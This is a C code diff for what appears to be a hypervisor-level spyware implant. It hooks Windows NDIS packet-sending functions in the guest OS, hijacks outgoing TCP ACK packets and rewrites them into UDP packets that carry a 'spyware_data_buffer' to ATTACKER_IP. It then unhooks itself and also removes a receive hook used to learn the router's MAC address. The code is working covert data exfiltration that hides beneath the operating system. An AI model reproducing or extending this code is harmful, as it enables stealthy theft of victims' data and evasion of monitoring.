@@ -9,6 +9,7 @@
 #include <network/udp.h>
 #include <network/dhcp.h>
 #include <network/arp.h>
+#include <network/tcp.h>
 
 __attribute__((section(".vmm"))) void handle_NdisSendNetBufferLists_hook(vmexit_data_t *state){
 
@@ -29,10 +30,6 @@ __attribute__((section(".vmm"))) void handle_NdisSendNetBufferLists_hook(vmexit_
 
     // Now left only with single of each (one-node lists only).
 
-    if (*(uint32_t*)guest_virtual_to_physical(NET_BUFFER_DataOffset(PNetBuffer)) < 202) return;
-
-    // Now left only with packets which have 202 bytes of free space in their buffer
-
     uint64_t pkt_pfn = *(uint64_t*)guest_virtual_to_physical(MDL_PhysicalPage(PMdl));
     uint32_t byte_offset = *(uint32_t*)guest_virtual_to_physical(MDL_ByteOffset(PMdl));
     uint32_t data_offset = *(uint32_t*)guest_virtual_to_physical(NET_BUFFER_DataOffset(PNetBuffer));
@@ -40,18 +37,58 @@ __attribute__((section(".vmm"))) void handle_NdisSendNetBufferLists_hook(vmexit_
 
     byte_t *physical_pkt_addr  = pkt_pfn*PAGE_SIZE + byte_offset + data_offset;
 
-    *(uint32_t*)guest_virtual_to_physical(NET_BUFFER_DataOffset(PNetBuffer)) = 0;       // Change DataOffset to 0
-    *(uint32_t*)guest_virtual_to_physical(NET_BUFFER_CurrentMdlOffset(PNetBuffer)) = 0; // Change CurrentMdlOffset to 0
-    *(uint32_t*)guest_virtual_to_physical(NET_BUFFER_DataLength(PNetBuffer)) = 256;     // Change DataLength to 256
-    
-    byte_t *new_pkt = physical_pkt_addr - data_offset;
+    ethernet_t *eth_hdr = physical_pkt_addr;
+    if (eth_hdr->type != FLIP_WORD(ETHERNET_TYPE_IP)) return;
+    ip_t *ip_hdr = eth_hdr->payload;
+    if (ip_hdr->protocol != IPV4_PROTOCOL_TCP) return;
+    tcp_t *tcp_hdr = ip_hdr->payload;
+    if (tcp_hdr->flags.value != TCP_ACK_ONLY) return;
 
-    // new_pkt[0] = 0x11;
-    // new_pkt[1] = 0x11;
-    // new_pkt[2] = 0x11;
-    // new_pkt[3] = 0x11;
-    // new_pkt[4] = 0x11;
-    // new_pkt[5] = 0x11;
+    // Now only left with normal TCP ACK packets
+    
+    uint32_t total_packet_size = sizeof(ethernet_t)+sizeof(ip_t)+sizeof(udp_t)+2+shared_cores_data.spyware_data_buffer.length;
+    AcquireLock(&shared_cores_data.spyware_data_lock);
+    if (!shared_cores_data.send_pending){       
+        // this means that another core has already sent the data before we acquired the lock.
+        ReleaseLock(&shared_cores_data.spyware_data_lock);
+        return;
+    }
+    if (data_length + data_offset < total_packet_size){
+        // packet not big enough for some reason.
+        ReleaseLock(&shared_cores_data.spyware_data_lock);
+        return;
+    }
+
+    *(uint32_t*)guest_virtual_to_physical(NET_BUFFER_DataOffset(PNetBuffer)) = data_offset+data_length-total_packet_size;       // Must be at the top of the MDL
+    *(uint32_t*)guest_virtual_to_physical(NET_BUFFER_CurrentMdlOffset(PNetBuffer)) = data_offset+data_length-total_packet_size; // Must be at the top of the MDL
+    *(uint32_t*)guest_virtual_to_physical(NET_BUFFER_DataLength(PNetBuffer)) = total_packet_size;
+    
+    // Tell the NIC to calculate IP and UDP checksums
+    NDIS_TCP_IP_CHECKSUM_NET_BUFFER_LIST_INFO *tcpip_info = guest_virtual_to_physical(NET_BUFFER_LIST_INFO(PNetBufferLists, NDIS_NET_BUFFER_LIST_INFO_TcpIpChecksumNetBufferListInfo));
+    tcpip_info->Transmit.IsIPv6 = 0;
+    tcpip_info->Transmit.IsIPv4 = 1;
+    tcpip_info->Transmit.TcpChecksum = 0;
+    tcpip_info->Transmit.TcpHeaderOffset = 0;
+    tcpip_info->Transmit.IpHeaderChecksum = 1;
+    tcpip_info->Transmit.UdpChecksum = 1;
+
+    byte_t *new_pkt = pkt_pfn*PAGE_SIZE + byte_offset + (data_offset+data_length-total_packet_size);
+    memset(new_pkt, 0, total_packet_size);
+    eth_hdr = new_pkt;
+    ip_hdr = eth_hdr->payload;
+    udp_t *udp_hdr = ip_hdr->payload;
+    build_ethernet(new_pkt, shared_cores_data.router_mac, "IP");
+    build_ip(ip_hdr, sizeof(udp_t)+2+shared_cores_data.spyware_data_buffer.length, ATTACKER_IP);
+    *(uint16_t*)(udp_hdr->payload) = shared_cores_data.spyware_data_buffer.length;
+    memcpy(udp_hdr->payload+2, shared_cores_data.spyware_data_buffer.chars, shared_cores_data.spyware_data_buffer.length);
+    build_udp(udp_hdr, SRC_PORT, DST_PORT, ip_hdr, 2+shared_cores_data.spyware_data_buffer.length);
+
+    shared_cores_data.spyware_data_buffer.length = 0;
+
+    // remove the hook and release the lock
+    shared_cores_data.send_pending = FALSE;
+    *(byte_t*)guest_virtual_to_physical(shared_cores_data.ndis + NDIS_NdisSendNetBufferLists_OFFSET) = PUSH_RBP;
+    ReleaseLock(&shared_cores_data.spyware_data_lock);
 
 }
 
@@ -116,6 +153,10 @@ __attribute__((section(".vmm"))) void handle_NdisMIndicateReceiveNetBufferLists_
                         shared_cores_data.router_mac[5],
                         shared_cores_data.router_mac[6]);
                     shared_cores_data.mac_ready = TRUE;
+
+                    // remove the receive hook
+                    *(uint16_t*)guest_virtual_to_physical(shared_cores_data.ndis + NDIS_NdisMIndicateReceiveNetBufferLists_OFFSET) = PUSH_R12;
+
                 }
             }
         }
